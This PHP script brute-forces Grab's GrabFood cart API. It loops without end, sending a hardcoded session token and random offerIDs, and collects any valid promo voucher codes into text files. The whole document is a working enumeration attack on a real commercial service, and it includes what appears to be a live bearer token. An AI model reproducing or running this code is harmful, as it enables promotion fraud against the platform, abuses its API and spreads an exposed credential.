<?php
error_reporting(0);
while(true){
$base = '32'.random(4,0);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://p.grabtaxi.com/api/passenger/v4/grabfood/cart');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$headers = array(
    'Accept-Language: in-ID;q=1.0, en-US;q=0.9, en;q=0.8',
    'User-Agent: Grab/5.153.0 (Android 11; Build 25143589)',
    'x-mts-ssid: eyJhbGciOiJSUzI1NiIsImtpZCI6Il9kZWZhdWx0IiwidHlwIjoiSldUIn0.eyJhdWQiOiJQQVNTRU5HRVIiLCJleHAiOjQ3NzczOTczODksImlhdCI6MTYyMzc5NzM4NiwianRpIjoiNjIxMjJhNDgtOWZjYy00ZmFlLWIzZDYtZDg1MGM5NTExN2FhIiwibG1lIjoiUEhPTkVOVU1CRVIiLCJuYW1lIjoiIiwic3ViIjoiY2ZiMGQ3ZDQtODU3Ny00MzFlLWI4NWUtZDAwZWViNDViMDZhIn0.nARHl_oWieEK35b4hhlwWnHEeeubC6_raU4CXyatP-T0lkV2zmEnveNh3utf8HEd9tJP2yE4n35sXNnXneOw6HxOZrA54XPEjgxjzIDvN7K1aPYiy3ceFUlw8s66s48KXluOvFRpMXXThc38W0y6EXoA-gXXxiOGWWF0C8Sz-JeG-QvzhflUeTkNwkiROuju3uhslzYaHHKwQWoU_RqWAu4GZp2xbWIAlLnbnmtO0xa3QXih53WNObwCrPts1bDtz8xBrwIFpKkgHrkTzil4KUNjCVzWXIdufv0SH8uh-vLgTXuuf4IlQ3tD4TFd_Hup74ANq7QePUxBXGuP5xbyGXyK0VPR2L_0HvDjsrJfROE8KAJ8vHnIhbXJQmVcah4Rz_rnAe69mlP1BeecrTzsjxC5VVq-MmRha55nHTEBAtDI0fIBwFjw564_aVvGBmU08PzI3yV96kH-5tJClg8FE2WYAX9qEcyly0kBSvhpOGWmfpuGHIgw6h1br4YrnFF0s8fFSQVq7dCvdNjfotO4ZIX5LGpHaBYaRVfikli7St08VedRhDbHCoulFSu5jmSyWEImc3oMpIoTn45O9-ItIkgjIMri-6fGXmeHHrfTltFx_7OJ2_g8xgA6FhesanXy-IMJnZ4XuuiFH2E5g2Ce_nqOStZssenIJUONd7pQOFU',
    'Content-Type: application/json; charset=UTF-8','x-request-id: f5c396fb-363a-4381-8d41-e001debfd816');
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"campaignIDs":["SSCJKTSalEliExc10kV2-C2MF123VJ4KVE-15858922"],"cartFlags":{"isCampaignRateLimitExceeded":false,"isGrabAhead":false},"comment":"","deliverBy":"GRAB","destination":{"editedAddress":false,"fromShoppingCart":false,"latitude":-6.12,"longitude":107.12,"poiID":"IT.1IFV412120EMQ7"},"dineInInfo":null,"enterprise":null,"fromPlanPurchased":false,"groupOrderParams":null,"insuranceOptOption":0,"merchants":[{"ID":"IDGFSTI00002a1a","comment":"","cutlery":0,"items":[{"ID":"IDGFSTI00002x4t12121923639199518","comment":"","modifierGroups":null,"quantity":1},{"ID":"1","comment":"","modifierGroups":null,"quantity":2}],"section":"SECF7E83644BF7123A632828C1B7FBD886S"}],"paymentTypeID":"","promoCode":[{"cashbackInfo":null,"endTime":1625072399,"isSpotOffer":false,"offerID":'.$base.',"originalPromoAmountInMin":0,"promoAmount":0,"promoAmountInMin":0,"promoAmountKeepPrecision":0.0,"promoAmountV2":null,"promoCode":"","promoCodeID":0,"promoCodeUUID":null,"promoDescription":"","promoID":0,"promoInvalid":false,"promoInvalidDescription":null,"promoName":"COBAINGRAB","offerPromoSubType":"grab","promoType":"grab","redemptionID":0,"redemptionUUID":null,"startTime":16221348001,"targetedPriceInMin":0,"targetedPriceV2":null}],"scheduledTime":null,"stackableOfferOption":0}');



$result = curl_exec($ch);
$json = json_decode($result, true);
$desc = $json['promoCodes'][0]['promoDescription'];
$invalidStatus = $json['promoCodes'][0]['promoInvalidDescription'];
$codeVoc = $json['promoCodes'][0]['promoCode'];
$promoName = $json['promoCodes'][0]['promoName'];


if($invalidStatus == 'The provided currency code is not valid.')
{
} else if ($codeVoc == null){}else if($promoName == null){} elseif ($json['promoCodes'] == null ){} else if(preg_match('/GrabFood/',$desc))
{
     echo "\033[32m[GRABFOOD]\033[0m => CODE: ".$codeVoc." | $promoName | $desc | \n\n";
     file_put_contents('grabFood.txt'," CODE: ".$codeVoc." | $promoName | $desc | \n".PHP_EOL,FILE_APPEND);

}else{
echo 'CODE:'.$codeVoc.' | '.$promoName.' | '.$desc.' | '.$invalidStatus.' => [ '.$json['promoCodes'][0]['offerID'].' ]';echo"\n\n";
file_put_contents('grabOther.txt'," CODE: ".$codeVoc." | $promoName | $desc | $invalidStatus\n".PHP_EOL,FILE_APPEND);

}
}

function random($length,$a) 
	{
		$str = "";
		if ($a == 0) {
			$characters = array_merge(range('0','9'));
		}elseif ($a == 1) {
			$characters = array_merge(range('0','9'),range('a','z'));
		}
		$max = count($characters) - 1;
		for ($i = 0; $i < $length; $i++) {
			$rand = mt_rand(0, $max);
			$str .= $characters[$rand];
		}
		return $str;
	}